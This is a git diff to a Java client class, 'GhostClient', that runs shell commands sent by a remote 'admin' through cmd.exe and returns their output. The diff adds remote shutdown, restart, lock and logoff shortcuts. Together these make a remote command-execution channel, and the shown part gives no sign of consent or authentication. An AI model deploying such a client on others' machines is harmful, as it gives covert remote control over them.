@@ -265,13 +265,47 @@ public class GhostClient {
     }
 
     /**
-     * Execute a shell command and send output back to admin
+     * Execute a shell command and send output back to admin.
+     * Handles built-in shortcut commands (e.g. /shutdown, /restart, /lock)
+     * and strips leading '/' from regular commands for convenience.
      */
     private void executeShellWithOutput(String command) {
         String clientName = System.getProperty("user.name");
+
+        // Handle built-in shortcut commands
+        String cmdLower = command.trim().toLowerCase();
+        if (cmdLower.equals("/shutdown") || cmdLower.startsWith("/shutdown ")) {
+            // Convert /shutdown to proper Windows shutdown command
+            String args = command.trim().substring("/shutdown".length()).trim();
+            String shutdownCmd = "shutdown " + (args.isEmpty() ? "/s /t 0" : args);
+            executeDirectCommand(shutdownCmd);
+            sendShellOutput(clientName, command, "Executing: " + shutdownCmd);
+            return;
+        } else if (cmdLower.equals("/restart") || cmdLower.startsWith("/restart ")) {
+            executeDirectCommand("shutdown /r /t 0");
+            sendShellOutput(clientName, command, "Executing: shutdown /r /t 0");
+            return;
+        } else if (cmdLower.equals("/lock")) {
+            executeDirectCommand("rundll32.exe user32.dll,LockWorkStation");
+            sendShellOutput(clientName, command, "Workstation locked");
+            return;
+        } else if (cmdLower.equals("/logoff")) {
+            executeDirectCommand("shutdown /l");
+            sendShellOutput(clientName, command, "Executing: shutdown /l");
+            return;
+        }
+
+        // Strip leading '/' from commands (common mistake: /ipconfig instead of
+        // ipconfig)
+        String cleanCmd = command.trim();
+        if (cleanCmd.startsWith("/")) {
+            cleanCmd = cleanCmd.substring(1);
+        }
+
+        final String finalCmd = cleanCmd;
         CompletableFuture.runAsync(() -> {
             try {
-                ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", command);
+                ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", finalCmd);
                 pb.redirectErrorStream(true);
                 Process p = pb.start();
 
@@ -284,25 +318,25 @@ public class GhostClient {
                 p.waitFor();
 
                 // Send output back to admin
-                if (out != null) {
-                    String response = clientName + " > " + command + "\n" + output.toString();
-                    CommandPacket outputPacket = new CommandPacket(
-                            CommandPacket.Type.SHELL_OUTPUT,
-                            clientName,
-                            response);
-                    out.println(gson.toJson(outputPacket));
-                }
+                sendShellOutput(clientName, command, output.toString());
             } catch (Exception e) {
                 // Send error back to admin
-                if (out != null) {
-                    String errorResponse = clientName + " > " + command + "\nError: " + e.getMessage();
-                    CommandPacket errorPacket = new CommandPacket(
-                            CommandPacket.Type.SHELL_OUTPUT,
-                            clientName,
-                            errorResponse);
-                    out.println(gson.toJson(errorPacket));
-                }
+                sendShellOutput(clientName, command, "Error: " + e.getMessage());
             }
         });
+    }
+
+    /**
+     * Helper to send shell output back to admin
+     */
+    private void sendShellOutput(String clientName, String command, String output) {
+        if (out != null) {
+            String response = clientName + " > " + command + "\n" + output;
+            CommandPacket outputPacket = new CommandPacket(
+                    CommandPacket.Type.SHELL_OUTPUT,
+                    clientName,
+                    response);
+            out.println(gson.toJson(outputPacket));
+        }
     }
 }
